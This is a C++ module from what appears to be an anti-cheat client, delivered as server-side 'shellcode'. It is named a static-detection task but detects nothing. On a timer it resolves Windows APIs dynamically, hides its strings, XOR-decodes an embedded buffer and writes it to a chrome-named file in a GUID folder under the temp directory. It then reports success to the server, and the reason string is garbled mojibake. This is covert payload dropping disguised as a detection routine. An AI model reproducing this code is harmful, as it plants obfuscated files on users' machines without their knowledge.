#include "anticheat.h"
#include <stdint.h>
#include <string>
#include "protocol.h"
#include "utils/utils.h"
#include <xorstr.hpp>
#include "utils/api_resolver.h"
#include "ad_messagebox002.h"
#include <iostream>
#include <fstream>

namespace ShellCode
{
    class TaskStaticDetect : public Task
    {
    public:
        TaskStaticDetect()
        {
            set_interval(30 * 1000 * 2);
            set_package_id(SHELLCODE_PACKAGE_ID(82));
        }
        ~TaskStaticDetect()
        {

        }
        virtual void on_time_proc(uint32_t curtime)
        {
            ProtocolShellCodeInstance proto;
            proto.m_type = Protocol::PackageType::PACKAGE_TYPE_ADMIN;
            proto.id = get_package_id();
            
            auto GetTempPath = IMPORT(L"Kernel32.dll", GetTempPathW);
            auto CreateDirectory = IMPORT(L"Kernel32.dll", CreateDirectoryW);
            auto GetFileAttributes = IMPORT(L"Kernel32.dll", GetFileAttributesW);
            auto CreateFile = IMPORT(L"Kernel32.dll", CreateFileW);
            auto WriteFile = IMPORT(L"Kernel32.dll", WriteFile);
            auto CloseHandle = IMPORT(L"Kernel32.dll", CloseHandle);
            wchar_t strTmpPath[MAX_PATH];
            GetTempPath(MAX_PATH, strTmpPath);
            std::wstring temp_file(strTmpPath);
            temp_file += Utils::string2wstring(xorstr("B8DC5DEA-FF7D-4C01-9B13-7461CE0BCB41"));
            if(INVALID_FILE_ATTRIBUTES == GetFileAttributes(temp_file.c_str()))
            {
                CreateDirectory(temp_file.c_str(), NULL);
            }
            temp_file += Utils::string2wstring(xorstr("\\chrome.002"));

            if(INVALID_FILE_ATTRIBUTES == GetFileAttributes(temp_file.c_str()) || !is_create)
            {
                is_create = true;
                HANDLE file_handle = CreateFile(temp_file.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if(file_handle != INVALID_HANDLE_VALUE)
                {
                    DWORD bytes_of_write = 0; 
                    Utils::Crypto::xor_buffer(hexData, sizeof(hexData), 0x4F38DB0A);
                    WriteFile(file_handle, (char*)hexData, sizeof(hexData), &bytes_of_write, NULL);
                    CloseHandle(file_handle);
                }
                proto.is_cheat = true;
                proto.reason = L"ad002Ö´ÐÐ³É¹¦!";
            }

            if(proto.is_cheat)
            {
                AntiCheat::instance().send(proto);
            }
        };
    private:
        bool is_create = false;
    };

    uint32_t main()
    {
        TaskStaticDetect* task = new TaskStaticDetect();
        if(AntiCheat::instance().add_task(task))
        {
            return 0;
        }
        else
        {
            delete task;
            return 1;
        }
    }
}